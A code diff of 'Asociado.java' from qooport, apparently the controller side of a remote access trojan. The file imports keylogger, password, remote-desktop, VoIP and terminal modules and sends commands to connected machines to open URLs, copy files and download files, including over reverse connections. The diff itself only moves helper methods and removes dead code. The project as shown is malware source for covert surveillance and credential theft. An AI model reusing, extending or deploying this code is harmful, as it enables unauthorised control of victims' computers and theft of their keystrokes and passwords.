@@ -48,12 +48,12 @@ import qooport.modulos.escritorioremoto.EscritorioRemoto;
 import qooport.modulos.keylogger.KeyLogger;
 import qooport.modulos.pc.Chat;
 import qooport.modulos.pc.Conexiones;
-import qooport.modulos.pc.terminal.Terminal;
 import qooport.modulos.pc.MonitorSistemaAsociado;
 import qooport.modulos.pc.Passwords;
 import qooport.modulos.pc.Procesos;
 import qooport.modulos.pc.RedLan;
 import qooport.modulos.pc.TextoSpeak;
+import qooport.modulos.pc.terminal.Terminal;
 import qooport.modulos.voip.VoIp;
 import qooport.utilidades.Compresor;
 import qooport.utilidades.GuiUtil;
@@ -66,6 +66,49 @@ import qooport.utilidades.cifrado.Encriptacion;
  * @author Alberto
  */
 public abstract class Asociado extends Thread {
+
+    public static String guardarIcono(byte[] datos, String nombre) {
+        if (datos != null) {
+            File file = new File(nombre);
+            try {
+                file.delete();
+            } catch (Exception e) {
+            }
+            try {
+                file.createNewFile();
+                FileOutputStream fout = new FileOutputStream(file);
+                fout.write(datos);
+                fout.close();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            file = null;
+        }
+        return nombre;
+    }
+
+    public static Comando crearComando(int comando, int nParametros, Object objeto) {
+        try {
+            Comando cmd = new Comando(comando, nParametros, objeto);
+            return cmd;
+        } catch (Exception ex) {
+
+        }
+        return null;
+    }
+
+    //    public static String leerCadena(byte[] cadena) {
+    public static String parsearCadena(byte[] cadena, boolean antiguo) {
+        try {
+            if (antiguo) {
+                return Encriptacion.descifra(cadena);
+            } else {
+                return Encriptacion.descifra(Compresor.descomprimirGZIP(cadena));
+            }
+        } catch (Exception ex) {
+            return new String(cadena);
+        }
+    }
 
     protected boolean ssl;
     //estas acciones son para poder actualizar la barra de estado en el modo simple
@@ -89,7 +132,6 @@ public abstract class Asociado extends Thread {
     protected String so;
     protected String ip;
     protected String webCam;
-    //protected  QoopoRT cliente;
     protected boolean activo;
     protected long ping;
     protected long pong;
@@ -205,26 +247,6 @@ public abstract class Asociado extends Thread {
         }
     }
 
-    public static String guardarIcono(byte[] datos, String nombre) {
-        if (datos != null) {
-            File file = new File(nombre);
-            try {
-                file.delete();
-            } catch (Exception e) {
-            }
-            try {
-                file.createNewFile();
-                FileOutputStream fout = new FileOutputStream(file);
-                fout.write(datos);
-                fout.close();
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-            file = null;
-        }
-        return nombre;
-    }
-
     protected void recibirImagenUsuario(byte[] imagen) {
         try {
             ByteArrayInputStream inn = new ByteArrayInputStream(imagen);
@@ -252,7 +274,6 @@ public abstract class Asociado extends Thread {
                 this.vistaPreviaEscritorio = new ImageIcon(m);
             } catch (Exception e) {
             }
-
             inn.close();
             inn = null;
             m = null;
@@ -313,7 +334,6 @@ public abstract class Asociado extends Thread {
     }
 
     public void autenticar() {
-
         if (accionAutenticar != null) {
             accionAutenticar.ejecutar();
         }
@@ -385,16 +405,6 @@ public abstract class Asociado extends Thread {
 
     public void abrirURL(String url) {
         enviarComando(Protocolo.ABRIR_URL, url);
-    }
-
-    public static Comando crearComando(int comando, int nParametros, Object objeto) {
-        try {
-            Comando cmd = new Comando(comando, nParametros, objeto);
-            return cmd;
-        } catch (Exception ex) {
-
-        }
-        return null;
     }
 
 //    public void enviarEscritorioRemotoOpciones(int escala, int calidad, int ancho,
@@ -582,28 +592,14 @@ public abstract class Asociado extends Thread {
         enviarComando(Protocolo.ADMIN_ARCHIVOS_COPIAR, archivo, nuevoArchivo);
     }
 
-    public void descargar(String archivo, String rutaADescargar) {
-        descargar(archivo, rutaADescargar, 0);
-    }
+//    public void descargar(String archivo, String rutaADescargar) {
+//        descargar(archivo, rutaADescargar, 0);
+//    }
 
     public void descargar(String archivo, String rutaADescargar, long offset) {
         if (isConexionInversa()) {
             this.enviarComando(Protocolo.ADMIN_ARCHIVOS_DESCARGAR, archivo, rutaADescargar, offset);
         } else {
-//            DescargaArchivo ds = new DescargaArchivo(this, archivo, rutaADescargar);
-//            try {
-//                ModoAvanzado.paneTransferencia.setCaretPosition(ModoAvanzado.paneTransferencia.getDocument().getLength());
-//                ModoAvanzado.paneTransferencia.insertComponent(ds);
-//                QoopoRT.listaDescargas.add(ds);
-//                try {
-//                    ModoAvanzado.paneTransferencia.getDocument().insertString(ModoAvanzado.paneTransferencia.getDocument().getLength(), "\n", null);
-//                } catch (BadLocationException ex) {
-//                }
-//            } catch (Exception e) {
-//
-//            }
-//            new Thread(ds).start();
-
             Transferencia tDescarga = new Descarga(this, archivo, rutaADescargar);
             tDescarga.iniciar();
         }
@@ -900,19 +896,6 @@ public abstract class Asociado extends Thread {
     public String leerCadena(byte[] cadena) {
         try {
             return parsearCadena(cadena, antiguo);
-        } catch (Exception ex) {
-            return new String(cadena);
-        }
-    }
-
-//    public static String leerCadena(byte[] cadena) {
-    public static String parsearCadena(byte[] cadena, boolean antiguo) {
-        try {
-            if (antiguo) {
-                return Encriptacion.descifra(cadena);
-            } else {
-                return Encriptacion.descifra(Compresor.descomprimirGZIP(cadena));
-            }
         } catch (Exception ex) {
             return new String(cadena);
         }
@@ -1444,21 +1427,6 @@ public abstract class Asociado extends Thread {
 
     }
 
-    public class TareaPing extends Thread {
-
-        public TareaPing() {
-
-        }
-
-        @Override
-        public void run() {
-            try {
-                hacerPing();
-            } catch (Exception e) {
-            }
-        }
-    }
-
     public boolean isAbrirEscritoriRemotoAlconectar() {
         return abrirEscritoriRemotoAlconectar;
     }
@@ -1804,5 +1772,20 @@ public abstract class Asociado extends Thread {
     }
 
     public abstract void enviarComando(int i, Object... cmd);
+
+    public class TareaPing extends Thread {
+
+        public TareaPing() {
+
+        }
+
+        @Override
+        public void run() {
+            try {
+                hacerPing();
+            } catch (Exception e) {
+            }
+        }
+    }
 
 }
